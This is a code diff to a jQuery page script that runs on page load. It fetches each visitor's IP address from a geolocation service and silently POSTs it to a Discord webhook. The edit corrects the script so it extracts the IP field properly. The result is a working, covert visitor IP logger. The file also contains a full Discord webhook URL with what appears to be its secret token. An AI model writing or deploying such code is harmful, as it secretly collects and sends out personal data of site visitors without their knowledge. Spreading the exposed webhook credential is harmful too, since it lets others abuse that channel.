@@ -1,17 +1,17 @@
 $(document).ready(function() {
-    // Fetch IP information from ip-api.com on page load
-    $.getJSON('https://api.ipify.org?format=jsonp&callback=?', function(data) {  
+    // Fetch IP information from api.ipify.org on page load
+    $.getJSON('https://json.geoiplookup.io/?callback=?', function(data) {  
       // Send IP information to Discord webhook
-      var ipAddress = data; // Assuming 'query' contains the IP address
+      var ipAddress = data.ip; // Extract the IP address from the response object
       var discordWebhookURL = 'https://discord.com/api/webhooks/1183352632962719804/CBtTKAuz9fPxJx3epHcV4H40R50nNEBAwPUzgw0HF7GEaReV1KnHPj2lY6AFVBACOQfj';
-  
+    
       // Create the payload to send to Discord
       var discordPayload = {
         content: 'Visited IP: ' + ipAddress
       };
 
       console.log(JSON.stringify(data, null, 2));
-  
+    
       // Send data to Discord webhook
       $.ajax({
         type: 'POST',
@@ -25,7 +25,6 @@ $(document).ready(function() {
           console.error('Error sending IP to Discord webhook:', err);
         }
       });
-  
     });
   });
   
